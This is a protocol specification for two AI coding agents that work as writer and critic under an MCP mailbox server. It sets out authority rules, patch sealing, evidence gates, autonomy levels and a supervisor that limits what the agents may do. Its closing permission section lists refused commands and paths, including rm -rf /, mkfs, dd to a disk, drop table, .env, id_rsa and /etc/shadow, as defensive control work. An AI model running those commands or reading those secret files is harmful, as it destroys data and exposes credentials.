# Pair Programming Protocol

Two agents, different CLIs, one project, one task at a time. One writes, the other
breaks it on purpose. This document is the contract between them. It is short on
purpose: a rule is either enforced by the server, or it deserves the agent's
attention. Anything not here is not a rule.

See also `AGENTS.md` — that is the shape of the pair. This file is the part that
must not drift apart from the code.

> Language: this is the English original. The Russian mirror is
> [`PROTOCOL.ru.md`](./PROTOCOL.ru.md).

---

## 1. Exactly one writer

One role holds write authority. It edits files, runs tests, commits. The second is
read-only: it reads, searches, proposes patches.

### How the holder is chosen

`pair_claim(reason="...")`. Whoever took it writes; the other reviews. It is a race
and stays one: to choose deliberately rather than by click speed, both roles would
have to read the task and the code, and nobody waits for that.

But a race without an argument is just a queue. So the claim carries a `reason`: one
sentence on why it is you. It lands in the transcript, in `pair_state`, and **in the
peer's refusal** — the peer sees the other argument and may disagree with it.

Role names in the examples are the concrete pair `opencode` + `agy`. In any other
pair the names carry the same meaning but are their own: writer — `<writer>`, second
— `<critic>`. A role equals the CLI name and is baked in at install time.

```
<writer>:  pair_claim(reason="I already found where to fix it: retry in the client")
<critic>:  write authority is held by 'codex',
           which claimed it because: I already found where to fix it: retry in the client
```

From there the critic has two honest paths, neither involving the human:

- `pair_send` — name what it disagrees with, with `file:line`. The holder may change
  its mind and hand over authority itself.
- Agree, and work as the critic.

Neither path takes authority away from an active holder. A claim succeeds when authority is free or stale: released, a closed round (`closed_at` or phase `done` — the claim reopens it at `implement` with `round + 1`), an abandoned writer (closed round plus silence past `PAIR_STALL_SECONDS`), the standing policy naming the claimant (`by_policy` — on a free slot, or when the holder is dead: its process is gone AND tmux no longer has its panel), or any live role taking over a dead holder when no policy pins the claimant (rather than idling over a corpse).

### Standing arrangement: writer-pin

The standing arrangement pins **only the writer** (`bin/pairctl roles --writer X`).
The critic is not pinned: it is any second live role in the roster, so a CLI whose
limits ran out is swapped with `pairup --swap <cli>` and no paperwork — writer and
authority untouched. `--critic` is accepted and ignored with a warning (old calls
keep working); `--swap` moves the writer to the second live role from the roster.
Enforced by the server:

- `pair_claim` is refused while authority is held
- `pair_patch_reserve` is refused to the holder — it edits directly and does not need
  the mechanism
- `pair_patch_verify` and forward `pair_advance` are available to the holder only

`pair_task` is the exception to read-only, and it is deliberate: anyone may **add** a
task, only the writer may close one. See §5c.

## 2. Only the human moves authority

`bin/pairctl assign` and `bin/pairctl release`, and nowhere else.

**A peer's message does not transfer authority** — neither to grant it, take it, nor
borrow it for one edit. No agent tool writes `writer`.

Change the writer mid-task:

```sh
bin/pairctl release
bin/pairctl assign <role>      # the peer's role: agy, codex, claude — whatever your project uses
```

Say it in both panes, who writes now. The previous writer stays read-only even after
being interrupted and resumed: a revoked writer does not remember having been one.

There is a nuance easily mistaken for a violation: **the holder may hand authority
over itself.** `pair_release(why="...")` is its own decision, not a transfer by
message. An agent cannot take authority from another, but the holder may give it
away — and given authority cannot be taken back, because it is then free and
available to a new `pair_claim`.

Who writes, and what they claimed:

```sh
bin/pairctl why          # across all projects
bin/pairctl status       # in the current project, JSON
```

A script may not do this. `bin/pair-duo` used to run `pairctl assign` on its own, silently moving the trust boundary on every run; now it leaves authority alone unless no standing arrangement and no current writer exist, and says so out loud. The pair is always two *different* CLIs.

Swapping the critic's CLI (`pairup --swap <cli>`, `pair-duo --swap-critic`) is not
moving authority: the writer keeps writing, only the reviewer's process changes.
That is why it needs no `assign` and no human word — §2 guards who writes, not who
reviews.

## 3. A read-only agent proposes patches, it does not apply them

One command (preferred):

```
pair_propose(files=["a.py", "b.py"], subject="what it fixes")
# the server builds the diff itself, seals it, and delivers path+hash
# to the writer via pair_send with expects_reply
```

Manual path (legacy, for exotic cases — e.g. a diff assembled by hand):

```
pair_patch_reserve        # empty file 0600, exact path
# write a unified diff into that path
pair_patch_seal(path)      # the server computes and records the SHA-256
# active delivery straight into the writer's composer for immediate continuation:
pair_deliver(to="<writer>", text="patch at <path> sha256 <hash> — what it fixes, apply and continue")
# if the composer is busy — pair_send into the mailbox
```

The writer:

```
pair_patch_verify(path)    # recompute; mismatch — stop
pair_patch_applied(path, ok=True, note="commit abc1234")
```

- **Mismatch is a stop.** The patch changed after sealing. Do not apply it, ask for
  a reprint. This is the only protection against substitution between proposal and
  application.
- Copy the patch **once**, work on the copy.
- **Re-verify immediately before applying**, not at the start of review.

Both roles delete their files via `pair_patch_release` by **exact path**. Never a
glob: the directory is shared, and a patch you cannot see gets deleted with its own.

After an interruption — check whether the file is still there, and delete it by exact
path.

## 4. "The peer agreed" is not the human's approval

The most dangerous phrase in the system. It can be quoted, and it means nothing.

- An agent may say the peer agreed.
- An agent may not say that the action is therefore approved by the human (when the
  subject is authority transfer, or the six §12 stop triggers).
- No agent answers for the user: it does not grant rights in their name, does not
  touch secrets or production.

**Routine development is still autonomous:** agents do not ask the human for
permission to apply a patch, run tests, commit, or move phases. If the critic sealed
a patch, the writer applies it and continues without asking.

## 5. A round cannot close over unread mail

`pair_advance("done")` is refused while unread messages sit in the caller's inbox.

A report the writer did not read is not a report.

### 5a. A round cannot close without proof

`pair_evidence(kind, value, ok)` records a machine-checkable fact about the current
round: the test suite with its count and exit code, lint, typecheck, a diffstat, a
commit, a PR URL. Kinds: `test`, `lint`, `typecheck`, `build`, `diff`, `commit`,
`pr`, `manual`.

Evidence blockers apply in every autonomy level, including `observe`, and refusal wording never names a level as the reason: `semi` only *adds* the human's word (`pairctl ok`) on top.

In every mode a round cannot close while:

- there is no passing evidence for the current round;
- the last run of any kind failed;
- there is no passing `test` **from the writer** (in `mode=fix`, see below).

Per kind, the **last** run decides: tests failed → fixed → ran again, and the round
may close. `ok=false` is not a confession of failure but a record that holds the
round open until it is fixed or explained in a note.

Why the writer requirement: the gate exists to stop a round closing on an opinion.
Accepting `kind="test", ok=true` from a role that cannot run tests would close that
gate with the same words it was built to reject. In `mode=audit` the test requirement
does not apply — there the deliverable is findings, not a diff.

Evidence belongs to the round it was gathered in. What proved round 3 says nothing
about round 7, otherwise the gate becomes a sticker from the very first round.

Current-round records are never evicted from the journal. The closing gate reads
state, not the transcript, so an evicted failure would simply stop counting — a
round with red tests would close because the journal filled up. Older rounds are
still trimmed, or state would grow without bound.

Why any of this is needed: 78–96% of stated model confidence is exactly 100%. "The
critic is happy" is not a signal and must not reach `done`.

### 5b. A patch without an application holds the round open

`pair_patch_applied(path, ok, note)` — writer only, after a successful
`pair_patch_verify`, records the outcome. Before this verb existed, `applied` was set
at reserve time and never flipped, so "applied" and "sitting untouched since last
night" looked identical and a round closed quietly over a proposal nobody had
touched.

`ok=false` (a rejected hunk) counts as unresolved. To drop a patch deliberately is
`pair_patch_release`, which lands in the transcript as `patch_dropped`: "dropped" and
"forgotten" are different things, and the report must tell them apart.

**The writer may drop a patch they did not propose**, while it is still unresolved.
Otherwise the deadlock is real: the proposer may have gone away, `pair_patch_applied`
requires `verified_match` that a deleted file can no longer give, and nobody is left
who may remove the record. Every writer-side drop carries `released_by_writer`,
because "the author dropped it" and "the writer dropped it" are different facts. An
already-applied patch is not unresolved and may not be dropped.

A patch file deleted outside the server leaves the record behind; `pair_patch_release`
clears it, and does not need the file to exist.

### 5c. A round cannot close over an open task

`state["tasks"]` is a list, and `pairctl task "..."` appends to it rather than
overwriting. This exists because the state used to hold a single `task` string, and a
new task silently erased the old one: reproduced live, a round closed labelled with
task B carrying the tests and `ok` gathered for task A.

| | tool |
|---|---|
| add | `pair_task(action="add", text=...)` — anyone, including the critic |
| read | `pair_task(action="list")`, or `pairctl task` |
| close | `pair_task(action="done", id=N)` — writer only |
| drop | `pair_task(action="drop", id=N, reason="why not")` — writer only, reason required |

Rights are asymmetric on purpose. The critic must be able to say "I found this too"
without writing into someone else's notes, but implementing it is the writer's job,
so only the writer closes. An empty reason is refused: a task that vanishes silently
is the exact failure the list exists to prevent.

A round will not close while any task is `open`. The human can also do it: `pairctl
task --done N`, `pairctl task --drop N --reason "..."`.

`.pair/tasks.md` is generated from state and never hand-written, so it cannot drift
from the facts: per task, who added it, who closed it, why it was dropped, and the
evidence recorded against it. A dropped task with no reason prints as a defect rather
than passing quietly. `pairctl tasks` regenerates it and prints it; the pilot writes
it beside the round report.

Evidence records the task it proves when exactly one task is open, and stays
unattached with a snapshot of what was open when several are — the journal prints
those separately rather than guessing.

## 6. Stepping a phase back is open to both

Forward is the writer's. **One step back is anyone's:**

```
plan      → scoping     anyone
done      → implement   anyone
verify    → implement   anyone
implement → plan        anyone
```

This is the critic's veto, and it requires no write authority. Rounds close on the
finding the critic made after `done` — before, he was locked in a closed round and
his finding died in the mailbox.

Stepping back from `done` increments `round` and clears `closed_at`.

### The plan gate: `plan → implement` is machine-checked

Forward from `plan` to `implement` is refused by the server until the round has a
plan artefact and the neighbour's visа (round 55):

- **`​.pair/plan.md`** — the contract. First line is strictly `round: N` (N is the
  current round), then the sections `Goal`, `Invariants`, `Acceptance`. The marker
  exists for the same reason a stale verdict is refused: applying last round's plan
  silently is worse than having none.
- **The neighbour's visа** — a `kind=verdict` note containing `plan-ack round N`,
  written by any role but the writer (your own visа is refused: that would be the
  gate removing itself), not older than the plan file. In `mode=fix` only.
- **The waiting window** — `.pair/plan-gate.json` `{"ack_timeout_hours": 24}`: when
  the window expires and the writer has no open requests to the neighbour, the
  transition is allowed. An open request stops the clock — a remark nobody answered
  must not expire unnoticed.
- **Exempt**: every step back (including reopening `done → implement` after a
  finding — a gate that blocked reopening would lock itself), and `mode=audit`,
  where the deliverable is findings and an artefact is enough without a visа.

The gate is additive to §5a: it does not replace the evidence requirement, and it
does not touch the writer-only rule (§6 forward belongs to the writer regardless).

## 7. A live channel: the agent waits, it does not sleep

**The rule that makes the pair work: a turn ends with a bounded `pair_read`.**

Not as a preference — as the mechanism. Nothing can wake an agent that is not calling
any tool, and **no agent tool exists in any MCP implementation that can inject a turn
into another agent's client**: MCP is client-driven, so a server answers requests and
cannot push a new turn into the host. The mailbox is the only universal channel, and
reading it is the only universal wake-up.

That is why `pair_read` is a bounded wait rather than an instant read. An agent that
ends its turn with `pair_read(wait_seconds=N)` is never idle *with unread mail*: it is
either reading, or it already has the message. The cost is latency — the agent waits
instead of exiting. The alternative costs the round its night.

Delivery is the second path, and it is best-effort by nature:
- **`pair_deliver`** — active: types into the peer's pane and presses Enter.
- **`pair_send`** — passive: drops into the mailbox, which always works.

`pair_deliver` cannot be relied on. It needs the peer's composer to be visible, and a
full-screen TUI hides it: on OpenCode the capture holds only frames and a status line,
so delivery refuses with "composer not visible" and the message falls back to the
mailbox. The refusal is correct — typing into an unseen pane would send the text into
`vi`, `less` or a running build.

So the split is: **the mailbox is the guarantee, delivery is the accelerator.** A
wake-up adapter per CLI is allowed to exist, and the table below says so honestly; but
nothing may depend on one.

| CLI | adapter | if unsupported |
|---|---|---|
| OpenCode | plugin + host API | reminder only, mailbox still delivered |
| Antigravity (`agy`) | native reactive messaging | reminder only |
| Claude, Codex | `tmux send-keys` | reminder only |
| anything else | none | reminder only |

The supervisor nudges a role that has unread mail and has gone quiet — once per unread
batch, not every tick, recorded as `pilot_unread_nudge`. Reading resets the nudge, so the
next letter wakes again; a hanging `expects_reply` repeats every 2h until answered. That
nudge goes through the same unreliable delivery, so treat it as best-effort. The pull is
what actually works.

Two ways to send, then:

`pair_read(wait_seconds=N)` is the normal way to hear from your peer. Empty — call
again. The ceiling is 60 seconds; when time is up, get back to work.

Both roles may wait. A bounded wait cannot deadlock: it always expires and returns
the agent to its task.

The writer was once forbidden to wait at all, to rule out a deadlock. That killed the
channel: an agent that cannot wait falls asleep and never notices incoming messages,
and the human starts relaying them by hand. A live wait is part of the protocol, not
an optimisation.

**The server must not promise more than the client can sit through.** The effective
wait is the minimum of the protocol ceiling and the client's own budget
(`PAIR_CLIENT_TIMEOUT`, default 20000 ms) minus a 5s margin. When the client's timeout
is cut, the answer says so: `wait_capped_by_client_timeout`, the timeout, the
ceiling. Silence about it is the expensive part — an agent that cannot tell "nobody
answered" from "I was disconnected" draws a conclusion about its peer instead of
about its own client. The MCP `timeout` in `cli-profiles.json` must therefore exceed
`MAX_READ_WAIT_SECONDS`, and a test fails the suite if any profile does not.

## 7a. No manual relay: agents talk to each other directly

Agents are strictly forbidden to ask the user to relay messages, signals or prompts
into the neighbouring terminal window (for example: *"there's a request waiting in the
opencode window, please send it your confirmation..."*).

Such a conclusion grossly violates the contract of autonomous pair work:
1. To signal and wake the peer there is **`pair_deliver`** — an optional nudge:
   one short pointer line into the peer's active tmux input, never the full text.
   The text lives in the mailbox; the peer picks it up with `pair_read`.
   Delivery is best-effort (a busy composer refuses rather than overtypes),
   so the mailbox is the mandatory path and delivery is not.
2. For background exchange there is `pair_send` and `pair_read`.
3. The user gives the task at the start and accepts the finished PR at the end. The
   human is not a router between windows.

## 7b. Do not disturb the human: the pair closes the loop itself

Default, not a prompt ornament. Applies in every round unless §12 fires:

- The human is never called: no questions, no "take a look", no "confirm".
  Stuck — write a `pair_note` saying what is blocked and by what, take the
  next step yourself.
- The critic is silent for 15+ minutes — resend `pair_send` with
  `expects_reply` and keep working, the pilot catches them up.
- A critic with no objections does not go silent: a clean review names the
  next piece of work (open tasks, `docs/backlog/`), or says what is done.
- A verdict opens an obligation to the writer automatically — take `done`
  yourself when blockers are zero. Closed the round — take the next card
  from `docs/backlog/` yourself, the writer opens the new round.
- Uncertainty is resolved between the agents (§12): pick an option, record
  a `decision` with the reason, carry on.

Only six things stop the pair and ask the user (§12): secrets, ports,
deploys, migrations, data or history deletion. Everything else is
resolved without them — that is what `auto` means.

## 8. Answer "how's it going?" with a fact

Not "I'll check". Open `pair_state` or `pair_transcript` and say what is **true
right now**: phase, what is done, what is pending. If nothing changed, say that.

A promise to check is a way to spend time without saying anything.

## 9. Notes, not conversation

A conversation is neither shareable nor does it survive a restart. Anything the peer
must know after a context reset goes into a note:

```
plan      what was agreed and in what order
decision  the choice and the reason
finding   checked against the code, with file:line
verdict   the outcome of the check and what it did NOT cover
handoff   what is done, what was skipped, what is unclear
backlog   a real defect outside the task's scope
```

## 9a. Talk before work: the plan goes through the mailbox first

Applies in `mode=fix` only — in `audit` there are no commits, so there is
nothing to hold back.

Before the first commit of a round, the writer sends the plan through the
mailbox: `pair_send` with `expects_reply` and a subject containing `plan`
or `план` (either language). The critic
answers with an objection or an agreement — only then the code. No answer,
no code.

This is a discipline, not a server gate. `_answer_obligations` closes an
obligation on any message in the other direction, even a ping, because
judging content would be guesswork — so a ping that closed the obligation
is not an agreement. The writer waits for a substantive reply, not for the
obligation file to disappear.

Why: rounds used to skip the middle — the writer wrote code at once, the
critic answered with a verdict, and nothing in between was ever discussed
(rounds with empty-subject pings instead of a plan, October 2026).

### 9a-1. Two plans, one meeting (the "miting" rule)

The plan is not announced, it is BUILT. For any task that changes user-facing
behavior, touches more than one file, could break a dependency, or changes a
contract other code calls into — a tool, a fixture, a state file format:

1. **Both agents draft independently.** Each writes its own plan into a
   `pair_note(kind="plan")` BEFORE reading the other's. One agent's plan
   never seeds the other.
2. **Exchange, then critique.** After both plans exist, each reads the
   other's and sends its objections with `file:line` (§9: an objection
   without an anchor is noise).
3. **One agreed plan wins.** The final plan names: the chosen approach and
   why, alternatives rejected and why, edge cases the pair found — and
   LINKS the paths of both draft notes; otherwise "two independent plans"
   is an unverifiable claim, which is exactly what this round treated as
   a defect.
4. **Unknown technology — context7 or web search first.** Before choosing
   an approach that touches a library or API either agent hasn't verified
   against current docs, both agents check the docs via `context7` or
   web search. Guessing API shape from memory is refused by convention.
5. **Impact check before code.** The agreed plan lists: what can break,
   which callers/importers are affected (monorepo cross-links), whether
   rollback is safe (revert single commit), and which tests prove the
   boundary didn't regress.
6. **For user-facing features: an experience checklist.** What a user
   sees on open/close, what updates, what renders if there is nothing
   to show, error-state text, and confirm/cancel wording — written down
   before code, not polished after.
7. **Timebox, not deadlock.** Two exchanges on the plan (each side one
   iteration — exactly the server's MAX_OPEN_REVIEWS=2); disagreement
   after that is resolved by the writer with a recorded `decision`
   note. There is no infinite miting.

In `audit` this section does not apply — there are no commits to plan. In
`fix` the "miting" is a discipline for user-facing work and for cross-file
edits; a one-line doc typo does not need a meeting.

## 10. Git is part of the work

A branch per task, a commit after every green step, tests green as a precondition,
`push` and a PR at the end. **Never push to `main`.**

This is not "a separate explicit user action". An agent that considers the push and
the PR someone else's business leaves the work half done.

### 10a. Round mode: `fix` or `audit`

`bin/pairctl mode fix|audit` — the human decides what the round is for at all.
`fix` by default, and everything above holds as written.

In `audit` the project is deliberately not changed: nobody edits files, creates a
branch, commits, or proposes patches — the server refuses patch reservation and
records the refusal in the audit trail. The work is still real: findings, the peer's
refutation, and whatever is confirmed goes into `docs/backlog/`. In `fix` the fixed
cards are removed from `docs/backlog/` (recorded in the commit). The difference from
`fix` is not that the work is weaker but that its result is evidence rather than a
diff.

Write authority is not cancelled in `audit` — otherwise nobody could move the phase,
and §5 and §6 would still apply. What changes is the subject: the writer does not
commit code, it runs the round, holds the findings in notes, and moves what is
confirmed into `docs/backlog/`.

The mode lives in state, not in the task text. The reason: an agent gets its
instructions from state and its prompt, and those two must not contradict each other
— otherwise the agent that read its own instructions more carefully does the wrong
thing.

### 10b. How far the pair goes alone: `observe`, `semi`, `auto`

`bin/pairctl autonomy observe|semi|auto` (**`auto` by default**). This is a **separate**
axis from `mode`: `mode` answers "what the round does", `autonomy` answers "how far it
goes without the human". Merging them is wrong: `pairctl mode auto` would silently
turn an audit into a code change, because every audit check looks at
`mode == "audit"`.

| | restart a failed agent | confirm permissions | close the round |
|---|---|---|---|
| `auto` (default) | yes | allowlist only | needs proof; no word needed — the round may close itself |
| `semi` | yes | allowlist only | needs proof **and** the human's word: `bin/pairctl ok` |
| `observe` | no | no | needs proof; no human word needed |

Note that `observe` does **not** switch the gates off. An earlier version returned an
empty blocker list at the first line, which made `observe` the one mode where a round
closed with nothing at all — and it looked like a side effect rather than a decision.
`observe` means "do less", not "do not count". Proof is still required in every mode;
only the human's word and the restart differ.

`pair_state` returns `autonomy` and `autonomy_meaning`, plus `closing_blocked_by` —
the list of reasons `done` is impossible right now. An agent must see the reason
before spending a turn on a foregone refusal.

An unknown `autonomy` value (from state written by a newer build) reads as `observe`:
someone else's state must not grant this build more authority than the human asked
for. A **missing** key is different: that is an older state file, not a request for
caution, and it reads as `auto` — the default the human set.

#### 10b.1. Choosing the level once, at launch

The pair is started once and then works unattended until the result is on the table.
The level is chosen at that moment and not renegotiated mid-round, so the human is
asked **at most once** and, in `auto`, not at all.

`bin/pair-duo` takes `--autonomy observe|semi|auto`, with `--auto`, `--semi` and `--observe` as shorthands. The value is checked **before** tmux starts: a bad value is a usage error (`exit 2`), not a fall-through to the next source — a typo ignored after launch would leave the pair working at a level the human did not choose, and the only way to find out would be to notice the effect.

With no flag, `bin/pairctl launch-autonomy` resolves in this order, strongest first:

| source | what it looks like | wins over |
|---|---|---|
| `task` | `autonomy: semi` on the **first line** of the task | the file |
| `file` | `.pair/autonomy`, one word | the default |
| `default` | `auto` | — |

The source travels with the value into the transcript as `via=flag|task|file|default`.
A level nobody can account for becomes a dispute: "why did this round close itself?" has
no answer unless the reason was written down when it was decided.

The task line must **start** the task, not merely appear in it — otherwise the words "move this text about autonomy: semi" would silently demote the pair. A malformed task line or file falls through to the next source instead of failing the launch: refusing to start is worse than starting at a level the human can see in `pairctl status`.

`pairctl ok` means something specific: it counts only when said at `verify` or `done`,
the last word wins, and `bin/pairctl ok --revoke` takes it back. "I approve the plan"
and "the changes are verified" are different statements, and the gate used to treat
them as one. Revocation exists because a human who looks, says ok, and then sees
something else change had no way to unsay it. Stepping a phase back also invalidates
the word: it was given about something the human has since stopped seeing.

§12 is outside all of these axes. Secrets, ports, deploys, migrations, data deletion
and git history stop the pair at any level, including `auto`.

`bin/pairctl reset --yes` leaves autonomy at **`auto`**, the default. An earlier
version left it at `observe`, on the reasoning that wiping state should not raise
authority — but authority is measured against a default, and the human has set that
default to `auto`. Leaving `observe` stopped the pair against "work on your own and
come back with the result", and made the human notice. §12 sits outside this axis, so
`auto` never means "destructive work is allowed".

### 10c. Human-readable messages: one thought, the reason why

A commit is one thought: subject ≤72 chars, imperative
(`fix(pair): heartbeat last_seen on every call`, not "fixed/heartbeat fixes").
The body says WHY, not WHAT — what is visible in the diff. No "why" — do not
commit yet, write it first.

Banned words in messages: `comprehensive`, `robust`, `leverage`, `seamless`,
`cutting-edge`, `delve`, `tapestry`, `«в современном мире»`. The list grows
in place — new entries land here, in §10c, not in a side file that a closed
card deletes.

Notes: one entry is one fact, decision, or verdict. A sheet over 30 lines is
cut into separate plan/finding/decision entries. Duplicates of one thought
in different words are deleted, the exact one stays.

Code comments say only why it is this way and not otherwise, with a pointer
to the measurement or the card. Restating the code in words is banned.

The critic reviews messages as code: slop in a commit is a reasoned
objection, same as for code.

### 10d. Budget ceiling: round limits on machine metrics

`bin/pairctl budget [--reset] [--json]` — machine-visible limits for the active round to prevent infinite looping and runaway autonomy.

Metrics are strictly machine-verifiable (no self-reported token claims):
- `messages`: total `send` and `deliver` events in `transcript.jsonl` since the current round opened.
- `advances`: count of phase `advance` events within the active round.
- `hours`: wall-clock time elapsed since round opening.
- `restarts`: supervisor restart counts for participant roles recorded in `.pair/.restarts-*`.

Defaults configured or overridden via `.pair/budget.json`:
```json
{
  "max_messages": 200,
  "max_advances": 10,
  "max_hours": 24.0,
  "max_restarts": 10
}
```

Invariants (§10d, §12):
1. **`done` is never blocked**: Closing a round into `done` is always permitted, preventing deadlocks when limits are reached.
2. **Backward steps are never blocked**: Reverting a phase (`implement → plan`, `verify → implement`) is always permitted.
3. **Communication is never blocked**: `pair_send` remains open even if budget ceiling is exceeded.
4. **Forward progression blocked on breach**: Only forward phase changes (`plan → implement`, `implement → verify`) are refused by `ProtocolError`.
5. **Reset & fresh round**: Resetting is performed via `bin/pairctl budget --reset` (writes `.pair/budget-reset.json`) or automatically upon reopening a fresh round.

### 10e. Intent gate and Task Receipt

1. **Intent Gate (`scoping → plan`)**:
   Moving from `scoping` forward into `plan` requires an intent artifact `.pair/intent.md`.
   The file must start with `round: N` and contain three required sections:
   - `Problem` (or `Проблема`) — the root issue or motivation.
   - `Scope` (or `Границы`) — clear boundary of what is in and out of scope.
   - `Outcome` (or `Ожидаемый результат`) — acceptance criteria and deliverables.
   Stepping backward or reopening after `done` is never blocked.

2. **Task Receipt (`.pair/RECEIPT-<round>.md`)**:
   Upon advancing to `done`, the server automatically creates a machine receipt documenting the round execution:
   - Round number, close timestamp, task summary.
   - Active writer and participating peers.
   - Tasks closed during the round.
   - Recorded evidence items (test results, diffs, commits).
   - Final round budget metrics (message count, phase advances, wall-clock hours, supervisor restarts).

### 10f. Self-healing loop: `pair-heal`

When a background check, monitor, or peer reports negative evidence (`ok=false`) on a finished round (`phase == "done"`):
1. The server automatically triggers a heal-reopen: phase switches from `done → implement` and `round` increments by 1.
2. A remediation task `#<id>: auto-heal: <kind> failed — <value>` is added to the task ledger.
3. Event `heal_reopen` is appended to `transcript.jsonl`.
4. Flapping safeguard: maximum consecutive auto-heal attempts (`MAX_HEAL_ATTEMPTS = 3`). Exceeding the ceiling halts auto-reopening and requires human intervention.

### 10g. Machine PR Merge Gate and Feature Freeze

PR merging is gated by machine rules rather than prompt agreements:

1. **Sanctioned path: `bin/pairctl pr merge [pr_id] [--force] [--reason REASON]`**:
   Direct `gh pr merge` from a shell is outside the server process; GitHub Branch Protection provides the physical enforcement on GitHub, while `pairctl pr merge` is the only protocol-compliant merging path.
2. **Preconditions for merging (`check_pr_merge`)**:
   - **Phase constraint**: Phase must be strictly `verify` (merging during `implement`, `plan`, or `scoping` is refused).
   - **Environment**: Must be a valid git repository (fail-closed on merge path: "cannot verify: not a git repo").
   - **Test evidence**: Current round must have passing test evidence (`kind="test"`, `ok=True`).
   - **Peer review approval**: A non-stale `approve` verdict must exist (`kind == "verdict"`).
   - **No self-approval**: The verdict author must NOT be the current writer (`verdict.role != store.writer`).
   - **Staleness check**: Reuses canonical `review.is_stale(...)`. Any code modifications or commits touching reviewed files invalidate the verdict.
3. **Feature Freeze**:
   Enforced naturally by the staleness rule: once an approval verdict is issued, any subsequent commits or file modifications change HEAD or dirty status, causing `is_stale` to return True. This blocks both `pairctl pr merge` and `pair_advance("done")`.
4. **Bypass audit (`--force`)**:
   Bypassing the gate via `--force` requires a non-empty `--reason` and is recorded in `transcript.jsonl` as `pr_merge_forced`.

### 10h. Server Runtime Freshness & Supervisor Parking

1. **Server Runtime Freshness Gate (`server_freshness`)**:
   MCP servers are long-lived processes. When server source files (`mcp/pair_mailbox/*.py`) are edited, in-memory servers continue executing stale bytecode.
   - `pair_state` exposes runtime status: `server_fresh: bool` and `server_stale_files: list[str]`.
   - `pair_advance` fail-closed gate: Forward phase transitions and round reopenings (`done` → `implement`) are refused with `ProtocolError` if `server_fresh` is false, requiring server restart (`serve.sh`). Backward recovery steps (`PHASE_BACKWARD`) remain open.
   - `pairpilot` detects stale server processes and records `pilot_server_stale` events in the transcript.
2. **Supervisor Done Parking & Token Budget Protection**:
   In continuous supervisor mode, once a round reaches `phase: done`, `pairpilot` parks itself (`pilot_parked`) if no open tasks (`pair_task`) and no pending obligations exist:
   - Suppresses silence escalations, repetitive nudges, and note wake file escalations (`poll_wakes`) to prevent token quota waste on idle rounds.
   - Preserves active unblocking and wakes whenever a peer delivers a new message, opens a task, or changes the phase.
3. **Smart Auto-Compact**:
   Prevents context exhaustion stalls:
   - Automated `/compact` injection upon round closing (`done`).
   - Zero-delta timeout detection for stuck `Working...` states (> 300s).

## 11. Audit

`transcript.jsonl`, append-only, per event: a message, a capture, a phase
change, a patch reservation, sealing, hash verification, **and every refusal**.

Refusals are the most valuable part. A peer trying to cross the write boundary is
exactly the event worth keeping.

```sh
bin/pairctl log --limit 50
```

If a run cannot be reconstructed from this file, it did not happen, regardless of
the final report.

## 12. Stop trigger

Six things stop the pair and ask the user, and only six:

`.env`, secrets and tokens, deploy targets and ports, deploys, database
migrations, deletion of data or git history.

Everything else, including uncertainty, is resolved between the agents.
Uncertainty is not a reason to wake the human: pick an option, record a `decision`
with the reason, carry on.

## 13. The supervisor: who watches the pair while both are silent

Agents are passive by design: having finished a step, they wait for input. While
neither writes to the other the pair is idle, and only the human can wake it.
`bin/pairpilot` is a process that watches the pair from outside and does exactly
seven things: deferred delivery, nudging a silent role, confirming a permission
request **from the allowlist**, restarting a failed agent, signalling a stalled
patch, a checkpoint digest, and the report on round close.
You never start it by hand: `pairup` (daily, from the project folder),
`pair-duo --pilot` and `finish.sh` (step 5) raise it when dead and leave a live
one alone.

And it deliberately cannot: move a phase, grant or take write authority, commit,
apply another's patches, or touch project files. Otherwise §2 stops being a boundary.

`bin/pairctl roster` shows who is registered; `--prune` removes what is demonstrably
gone — the process is dead **and** the pane is either absent or belongs to another
live role. One fact is not enough: after a crash a live pane may be a shell the human
opened. Pruning refuses to remove whoever holds write authority, and every removal
lands in the transcript. `finish.sh` prunes before launching, so fresh agents do not
register on top of a previous session's pane records.

### 13a. Restarting a failed agent

Only when: the process is genuinely dead (pid does not answer), the pane is alive,
no live role shares it, autonomy is not `observe`, the launch command is known, and
the throttle allows it.

The command is taken "explicit before guessed": `--launch role=cmd`,
`PAIR_LAUNCH_<ROLE>`, `.pair/restart.json`, the `launch` field in
`cli-profiles.json`. No command means no restart, and `pilot_restart_impossible` lands
in the transcript with the reason. A guessed command is worse than a missing one: the
pane comes alive and immediately dies again.

**`respawn-pane` is run without `-k`.** tmux refuses to respawn a live pane, and that
is exactly right: after an agent crash, what occupies the pane is usually a shell or
a debugger the human opened. The restart fires only where the pane is genuinely dead,
and a busy one is left to the human with the refusal recorded.

A role comes back under the same name, because `install.sh` bakes the role into the
MCP config rather than into process memory. **A restart does not touch write
authority**: the writer remains whoever the human appointed. That is what makes a
restart safe — it repairs a process, not the trust boundary.

Restarting brings back a process, not a memory. The returned role has neither the
task nor the round's context, and nobody knows a generic way to resume an `agy` or a
`claude` session — so the pilot leaves a note in `.pair/notes/pilot-restart-<role>.md`
pointing at `.pair/tasks.md`, which lists what is left. Guessing a flag would require
the profile to know the protocol, and profiles should not.

Silence and death are cured differently and must not be mixed: silence is a nudge,
death is a restart. A live process must not be touched — it will not lose its
context while it is working.

A pane that does not exist is not brought up: a window the human closed is a
decision, not a stall.

A role whose process is dead does not make a pane shared. Verified live: `claude` and
`codex` had died and their roster entries outlived them, so `skip` contained all
three roles including a live one, and the supervisor stopped serving the project
because two dead neighbours appeared to share a pane with a living agent. A stale
role is announced once, because silence about it is what made this invisible; clearing
the roster stays the human's call.

### 13b. The permission allowlist

`resolve_permission_prompt` confirms only what matched the allowlist. The default
list is not "reading only": it is the work the protocol already requires without a
human, or the pair stalls at every step.

Allowed by default:

- reading: `Read`, `grep`, `glob`, `ls`, `cat`, `head`, `tail`, `find`;
- editing inside the project: `write`, `edit`, `create`, `replace`, `patch`, `apply`,
  `format`, `lint`;
- checks and builds: `pytest`, `unittest`, `ruff`, `mypy`, `tsc`, `make`, `npm run`,
  `build`, plus `python3`/`node` with a test or linter in the command;
- local git: `status`, `diff`, `log`, `add`, `commit`, `checkout`, `switch`,
  `branch`, `stash`;
- shipping the work: `git push` to a **feature branch** and `gh pr` — §10 requires
  a PR;
- artefact cleanup: `rm -rf build/` with a relative target.

Refused under any allowlist, checked first:

- **all of §12:** secrets (`.env`, `id_rsa`, `/etc/shadow`, `.pem`, `.npmrc`,
  `.aws`, tokens, passwords), ports and deploys (`deploy`, `kubectl`, `helm`,
  `docker`, `terraform`, `ssh`, `sudo`), migrations and database destruction
  (`migrate`, `drop table`, `truncate`), production;
- **system destruction:** `rm -rf /`, `rm -rf ~`, `rm -rf .`, `mkfs`, `dd if=`,
  `> /dev/sda`, `killall`;
